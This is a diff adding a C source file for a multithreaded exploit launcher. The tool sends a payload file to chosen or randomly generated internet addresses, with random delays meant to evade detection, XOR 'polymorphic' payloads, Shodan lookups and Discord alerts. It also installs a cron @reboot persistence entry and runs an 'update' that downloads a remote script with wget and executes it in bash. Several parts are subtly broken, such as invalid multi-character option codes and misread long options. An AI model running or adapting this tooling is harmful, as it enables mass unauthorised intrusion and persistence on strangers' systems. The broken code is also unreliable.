@@ -1,0 +1,434 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <errno.h>
+#include <signal.h>
+#include <time.h>
+#include <pthread.h>
+#include <ncurses.h>       // Real-time dashboard
+#include <jansson.h>       // JSON library for structured logging
+#include <curl/curl.h>     // For API and Discord/Slack integrations
+#include <getopt.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netdb.h>
+
+// Constants
+#define MAX_THREADS 100
+#define MAX_PAYLOAD_SIZE 4096
+#define MAX_BUFFER_SIZE 1024
+
+// Global variables
+int max_attempts = 3, timeout = 10, port = 2100;
+int verbose_mode = 0, random_mode = 0, adaptive_mode = 0, enable_polymorphic = 0, stealth_mode = 0;
+int total_attempts = 0, total_successes = 0, total_failures = 0;
+char *log_file = NULL, *custom_payload = NULL, *discord_webhook = NULL, *shodan_api_key = NULL;
+pthread_mutex_t log_mutex = PTHREAD_MUTEX_INITIALIZER, count_mutex = PTHREAD_MUTEX_INITIALIZER;
+char polymorphic_payload[MAX_PAYLOAD_SIZE];
+pthread_t threads[MAX_THREADS];
+int thread_index = 0;
+
+// Function prototypes
+void display_usage(char *prog_name);
+void handle_signal(int sig);
+void set_socket_timeout(int sock, int timeout);
+void generate_polymorphic_payload(char *original_payload);
+void log_to_file(const char *message);
+void log_to_json(const char *event_type, const char *details);
+void execute_exploit(char *target_ip);
+void *thread_worker(void *arg);
+void traffic_shaping(int sock);
+void update_dashboard();
+void init_dashboard();
+void end_dashboard();
+char *generate_random_ip();
+void send_discord_notification(const char *message);
+void check_for_updates();
+void setup_persistence();
+void query_shodan(const char *target_ip);
+char *read_payload_from_file(const char *filename);
+int connect_with_enhanced_retry(struct sockaddr_in sa);
+void generate_html_report(const char *filename);
+
+// Signal handling for graceful exits
+void handle_signal(int sig) {
+    end_dashboard();
+    printf("\nReceived signal %d. Exiting...\n", sig);
+    exit(0);
+}
+
+// Display usage instructions
+void display_usage(char *prog_name) {
+    printf("Usage: %s [options]\n", prog_name);
+    printf("Options:\n");
+    printf("  -h, --help                    Display this help message\n");
+    printf("  -t, --timeout <seconds>       Set socket timeout (default: 10)\n");
+    printf("  -r, --retries <number>        Set number of connection retries (default: 3)\n");
+    printf("  -l, --log <file>              Log events to the specified file\n");
+    printf("  -v, --verbose                 Enable verbose mode\n");
+    printf("  -P, --payload <file>          Use custom payload from specified file\n");
+    printf("  -m, --polymorphic             Enable polymorphic payloads\n");
+    printf("  -T, --tunnel <protocol>       Use protocol tunneling (http, dns, ftp, etc.)\n");
+    printf("  -i, --random-ip               Enable random IP mode\n");
+    printf("  -a, --adaptive                Enable AI-based adaptive target selection\n");
+    printf("  -p, --port <port>             Specify target port (default: 2100)\n");
+    printf("  --discord <webhook_url>       Send real-time notifications to Discord\n");
+    printf("  --shodan <api_key>            Use Shodan for target intelligence\n");
+    printf("  --persistence                 Enable post-exploitation persistence\n");
+    printf("  --update                      Enable auto-update\n");
+    printf("  --report <filename>           Generate an HTML/JSON report\n");
+    exit(0);
+}
+
+// Initialize ncurses dashboard
+void init_dashboard() {
+    initscr();
+    cbreak();
+    noecho();
+    nodelay(stdscr, TRUE);
+    keypad(stdscr, TRUE);
+    start_color();
+}
+
+// Update real-time dashboard display
+void update_dashboard() {
+    pthread_mutex_lock(&count_mutex);
+    clear();
+    mvprintw(0, 0, "Exploit Script Dashboard");
+    mvprintw(1, 0, "------------------------");
+    mvprintw(2, 0, "Total Attempts: %d", total_attempts);
+    mvprintw(3, 0, "Successes: %d", total_successes);
+    mvprintw(4, 0, "Failures: %d", total_failures);
+    mvprintw(5, 0, "Current Payload: %s", enable_polymorphic ? "Polymorphic" : "Standard");
+    mvprintw(6, 0, "Press Ctrl+C to Exit");
+    refresh();
+    pthread_mutex_unlock(&count_mutex);
+}
+
+// End ncurses dashboard
+void end_dashboard() {
+    endwin();
+}
+
+// Generate polymorphic payload
+void generate_polymorphic_payload(char *original_payload) {
+    int len = strlen(original_payload);
+    for (int i = 0; i < len; i++) {
+        polymorphic_payload[i] = original_payload[i] ^ 0xAA;  // XOR with a fixed key
+    }
+    polymorphic_payload[len] = '\0';
+}
+
+// Log messages to a file
+void log_to_file(const char *message) {
+    if (log_file) {
+        pthread_mutex_lock(&log_mutex);
+        FILE *log_fp = fopen(log_file, "a");
+        if (log_fp) {
+            time_t now = time(NULL);
+            fprintf(log_fp, "[%ld] %s\n", now, message);
+            fclose(log_fp);
+        }
+        pthread_mutex_unlock(&log_mutex);
+    }
+}
+
+// Execute the exploit on a target IP
+void execute_exploit(char *target_ip) {
+    struct sockaddr_in sa;
+    sa.sin_family = AF_INET;
+    sa.sin_port = htons(port);
+
+    if (inet_aton(target_ip, &sa.sin_addr) == 0) {
+        fprintf(stderr, "Invalid IP address: %s\n", target_ip);
+        return;
+    }
+
+    int sock = connect_with_enhanced_retry(sa);
+    if (sock < 0) {
+        pthread_mutex_lock(&count_mutex);
+        total_failures++;
+        pthread_mutex_unlock(&count_mutex);
+        update_dashboard();
+        return;
+    }
+
+    if (verbose_mode) printf("Connected to %s on port %d\n", target_ip, port);
+
+    traffic_shaping(sock);
+
+    if (enable_polymorphic) {
+        generate_polymorphic_payload(custom_payload);
+        send(sock, polymorphic_payload, strlen(polymorphic_payload), 0);
+    } else {
+        send(sock, custom_payload, strlen(custom_payload), 0);
+    }
+
+    close(sock);
+    pthread_mutex_lock(&count_mutex);
+    total_successes++;
+    pthread_mutex_unlock(&count_mutex);
+    update_dashboard();
+}
+
+// Worker thread function
+void *thread_worker(void *arg) {
+    char *target_ip = (char *)arg;
+    execute_exploit(target_ip);
+    free(target_ip);
+    return NULL;
+}
+
+// Main function
+int main(int argc, char *argv[]) {
+    signal(SIGINT, handle_signal);
+    signal(SIGTERM, handle_signal);
+
+    int opt;
+    static struct option long_options[] = {
+        {"help", no_argument, 0, 'h'},
+        {"timeout", required_argument, 0, 't'},
+        {"retries", required_argument, 0, 'r'},
+        {"log", required_argument, 0, 'l'},
+        {"verbose", no_argument, 0, 'v'},
+        {"payload", required_argument, 0, 'P'},
+        {"polymorphic", no_argument, 0, 'm'},
+        {"tunnel", required_argument, 0, 'T'},
+        {"random-ip", no_argument, 0, 'i'},
+        {"adaptive", no_argument, 0, 'a'},
+        {"port", required_argument, 0, 'p'},
+        {"discord", required_argument, 0, 'd'},
+        {"shodan", required_argument, 0, 's'},
+        {"persistence", no_argument, 0, 'pe'},
+        {"update", no_argument, 0, 'u'},
+        {"report", required_argument, 0, 'report'},
+        {0, 0, 0, 0}
+    };
+
+    while ((opt = getopt_long(argc, argv, "ht:r:l:vP:mT:iap:", long_options, NULL)) != -1) {
+        switch (opt) {
+            case 'h': display_usage(argv[0]); break;
+            case 't': timeout = atoi(optarg); break;
+            case 'r': max_attempts = atoi(optarg); break;
+            case 'l': log_file = optarg; break;
+            case 'v': verbose_mode = 1; break;
+            case 'P': custom_payload = read_payload_from_file(optarg); break;
+            case 'm': enable_polymorphic = 1;
+break;
+            case 'T': 
+                // Implement any tunneling logic if needed
+                break;
+            case 'i': 
+                random_mode = 1; 
+                break;
+            case 'a': 
+                adaptive_mode = 1; 
+                break;
+            case 'p': 
+                port = atoi(optarg); 
+                break;
+            case 'd': 
+                discord_webhook = optarg; 
+                break;
+            case 's': 
+                shodan_api_key = optarg; 
+                break;
+            case 0: // Handle long-only options
+                if (strcmp(long_options[optind].name, "persistence") == 0) {
+                    setup_persistence();
+                } else if (strcmp(long_options[optind].name, "update") == 0) {
+                    check_for_updates();
+                } else if (strcmp(long_options[optind].name, "report") == 0) {
+                    generate_html_report(optarg); 
+                }
+                break;
+            default:
+                display_usage(argv[0]);
+                return 1;
+        }
+    }
+
+    // Validate essential parameters
+    if (!custom_payload && !enable_polymorphic) {
+        fprintf(stderr, "Error: You must specify a payload file with -P or enable polymorphic mode with -m\n");
+        return 1;
+    }
+
+    // Initialize ncurses real-time dashboard
+    init_dashboard();
+
+    if (random_mode) {
+        while (1) {
+            char *target_ip = strdup(generate_random_ip());
+            pthread_create(&threads[thread_index++], NULL, thread_worker, target_ip);
+            if (thread_index >= MAX_THREADS) {
+                for (int i = 0; i < MAX_THREADS; i++) {
+                    pthread_join(threads[i], NULL);
+                }
+                thread_index = 0;
+            }
+            sleep(rand() % 3 + 1);  // Random delay between 1-3 seconds to avoid detection
+        }
+    } else if (optind < argc) {
+        char *target_ip = argv[optind];
+        execute_exploit(target_ip);
+    } else {
+        fprintf(stderr, "Target IP address is required\n");
+        display_usage(argv[0]);
+        return 1;
+    }
+
+    if (custom_payload) {
+        free(custom_payload);
+    }
+
+    end_dashboard();
+    printf("Finished processing.\n");
+    return 0;
+}
+
+// Function to simulate traffic shaping for stealth mode
+void traffic_shaping(int sock) {
+    if (stealth_mode) {
+        int random_sleep = rand() % 300 + 100;  // Sleep between 100ms to 300ms
+        usleep(random_sleep * 1000);  // Convert to microseconds
+    }
+}
+
+// Function to read the payload from a file
+char *read_payload_from_file(const char *filename) {
+    FILE *file = fopen(filename, "rb");
+    if (!file) {
+        perror("Failed to open payload file");
+        return NULL;
+    }
+    fseek(file, 0, SEEK_END);
+    long length = ftell(file);
+    fseek(file, 0, SEEK_SET);
+    char *buffer = malloc(length + 1);
+    if (buffer) {
+        fread(buffer, 1, length, file);
+        buffer[length] = '\0';
+    }
+    fclose(file);
+    return buffer;
+}
+
+// Generate random IP address
+char *generate_random_ip() {
+    static char ip[16];
+    snprintf(ip, sizeof(ip), "%d.%d.%d.%d",
+             rand() % 256, rand() % 256, rand() % 256, rand() % 256);
+    return ip;
+}
+
+// Function to set socket timeout
+void set_socket_timeout(int sock, int timeout) {
+    struct timeval tv;
+    tv.tv_sec = timeout;
+    tv.tv_usec = 0;
+    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char *)&tv, sizeof(tv));
+    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char *)&tv, sizeof(tv));
+}
+
+// Function to establish connection with retry logic
+int connect_with_enhanced_retry(struct sockaddr_in sa) {
+    int sock, attempts = 0, backoff = 1;
+    while (attempts < max_attempts) {
+        sock = socket(AF_INET, SOCK_STREAM, 0);
+        if (sock < 0) {
+            perror("Socket creation failed");
+            return -1;
+        }
+        set_socket_timeout(sock, timeout);
+        if (connect(sock, (struct sockaddr *)&sa, sizeof(sa)) == 0) {
+            return sock;
+        } else {
+            printf("Attempt %d: Connection failed (%s). Retrying in %d seconds...\n", 
+                   attempts + 1, strerror(errno), backoff);
+            sleep(backoff);
+            backoff *= 2;  // Exponential backoff
+            log_to_file("Connection attempt failed");
+            close(sock);
+            attempts++;
+        }
+    }
+    return -1;
+}
+
+// Function to check for script updates
+void check_for_updates() {
+    system("wget -q -O latest_version.sh https://example.com/latest_version.sh");
+    system("bash latest_version.sh");  // Execute update script if available
+    log_to_file("Checked for updates.");
+}
+
+// Function to set up persistence
+void setup_persistence() {
+    FILE *cron_file = fopen("/tmp/.mycron", "w");
+    if (cron_file) {
+        fprintf(cron_file, "@reboot /path/to/payload\n");
+        fclose(cron_file);
+        system("crontab /tmp/.mycron");
+        remove("/tmp/.mycron");
+        log_to_file("Persistence mechanism set up via cron job");
+    }
+}
+
+// Function to send notifications to Discord
+void send_discord_notification(const char *message) {
+    if (!discord_webhook) return;
+
+    CURL *curl = curl_easy_init();
+    if (curl) {
+        struct curl_slist *headers = NULL;
+        headers = curl_slist_append(headers, "Content-Type: application/json");
+
+        char json_message[MAX_BUFFER_SIZE];
+        snprintf(json_message, sizeof(json_message), "{\"content\": \"%s\"}", message);
+
+        curl_easy_setopt(curl, CURLOPT_URL, discord_webhook);
+        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_message);
+        CURLcode res = curl_easy_perform(curl);
+        if (res != CURLE_OK) {
+            fprintf(stderr, "Discord notification failed: %s\n", curl_easy_strerror(res));
+        }
+        curl_easy_cleanup(curl);
+        curl_slist_free_all(headers);
+    }
+}
+
+// Function to query Shodan API for target information
+void query_shodan(const char *target_ip) {
+    if (!shodan_api_key) return;
+
+    CURL *curl = curl_easy_init();
+    char shodan_url[256];
+    snprintf(shodan_url, sizeof(shodan_url), "https://api.shodan.io/shodan/host/%s?key=%s", target_ip, shodan_api_key);
+
+    if (curl) {
+        curl_easy_setopt(curl, CURLOPT_URL, shodan_url);
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL); // Direct output handling
+        curl_easy_perform(curl);
+        curl_easy_cleanup(curl);
+    }
+}
+
+// Function to generate HTML report
+void generate_html_report(const char *filename) {
+    FILE *file = fopen(filename, "w");
+    if (file) {
+        fprintf(file, "<html><head><title>Exploit Report</title></head><body>");
+        fprintf(file, "<h1>Exploit Attempt Summary</h1>");
+        fprintf(file, "<p>Total Attempts: %d</p>", total_attempts);
+        fprintf(file, "<p>Successful Exploits: %d</p>", total_successes);
+        fprintf(file, "<p>Failed Attempts: %d</p>", total_failures);
+        fprintf(file, "</body></html>");
+        fclose(file);
+        log_to_file("Generated HTML report.");
+    }
+}
